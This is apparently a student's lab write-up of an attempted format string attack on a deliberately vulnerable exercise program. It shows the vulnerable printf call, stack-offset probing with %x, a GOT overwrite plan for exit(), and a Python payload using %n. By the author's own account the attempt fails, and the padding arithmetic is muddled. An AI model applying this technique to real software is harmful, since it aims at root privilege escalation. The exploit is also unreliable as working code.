# Bonus #0
Full name: **Theodoros Moraitis** (Θεόδωρος Μωραΐτης) <br>
StudentID: **sdi2000150** (1115202000150)

## Careless Printing: Format string attack

This readme details how the format string exploit was crafted and executed against the vulnerable `camelot.c` program (`camelot` executable). The objective was to provide as an argument a string formatted in a way that the `printf()` inside the `check()` function overwrites a return address with the address of `the_kingdom_is_yours()` function provided in the program, which spawns a root shell. Sadly I didn't managed to create a successful exploit and gain root access, but I think i got close...

## Overview

By analyzing the program `camelot.c` (which is called by the `camelot_wrap.c`), I found out that a "careless print" happens inside the `check()` function. 
This is what is being executed when the key given is wrong:
```c
char * message;
asprintf(&message, "Wrong key: %s. No key, no entry!\n", key);
printf(message);
// free(message) // memleak - it's ok for now
```
We can see that the `printf(message)` is vulnerable because it directly prints the `message` string without any format specifiers. This allows an attacker to craft a format string that can read anything from the stack, or even write anywhere in it.

## Understanding the possible ways of achieving the format string attack

Firstly we need to find the address of the `the_kingdom_is_yours()` function. This is easy, just by running the program with gdb, then setting a breakpoint in check() function, running until that point, doing a disassembly of the check() function and then we can see the value `the_kingdom_is_yours()` has (which is a pointer to the function itself): ```0x804931f```
```asm
0x080493aa <+87>:    call   0x804931f <the_kingdom_is_yours>
```
<br>

The goal is to overwrite the return address with the address of the `the_kingdom_is_yours()` (`0x804931f`). <br>
The question is which return address? The return address of the `check()` function? The return address of a libc function via the GOT addresses provided? <br>

I started by trying to overwrite the return address of the `check()` function. I knew at some point I had to use the format specifier `%n` so that to overwrite the return address, but the hard part was how to reach it... <br>
By running the program like this:
```
$ camelot "AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x"
```
41414141 was printed at last (%x). So the 36th %x was AAAA itself. From this I could assume that the 36th argument on the stack is where our input string started. This means I could use this offset to control the format string exploit.

...After a lot of testing this did not end anywhere...
<br><br>
So i started thinking of the second way: overwritting a libc call via the GOT table.
I chose the exit() syscall:
```bash
$ objdump --dynamic-reloc /bin/camelot_real:
...
0804b384 R_386_JUMP_SLOT   exit@GLIBC_2.0
...
```
So, this is the exploit i crafted:
```python
import struct
import sys

# Addresses
the_kingdom_is_yours_addr = 0x0804931f      # Address of the_kingdom_is_yours
got_exit_addr = 0x0804b384                  # GOT entry for exit
offset = 36                                 # Number of %x to reach the start of input
# 0x0804931f = 134517535 in decimal (the_kingdom_is_yours)
# 0x0804b384 = 134525828 in decimal (exit)

payload = b""

# $ camelot $(python3 -c 'print("\x84\xb3\x04\x08%134513915u%36$n")')
# Add into payload the got_exit_addr
payload += struct.pack("I", got_exit_addr)

# Add into payload a number in decimal that if added to the current number of characters printed 
# (got_exit_addr) will be equal to the address of the_kingdom_is_yours:
# 134525828 + x = 134517535 <=> x = -8293 (negative?)
# or maybe 134517535 - 4 = 134517531 (?)
payload += b"%134517531u"

# The 36th argument is the first input given, so the got_exit_addr will be overwritted 
# with everything that is printed before the 36th argument (the address of the_kingdom_is_yours)
payload += b"%36$n"

sys.stdout.buffer.write(payload)
```

I tested it like this:
```bash
ubuntu@120bb0d88765:~$ python3 /exploit.py > payload
ubuntu@120bb0d88765:~$ camelot `cat payload` > tempout
```
So that it doesn't print forever in the terminal.<br>
Sadly it didn't work either...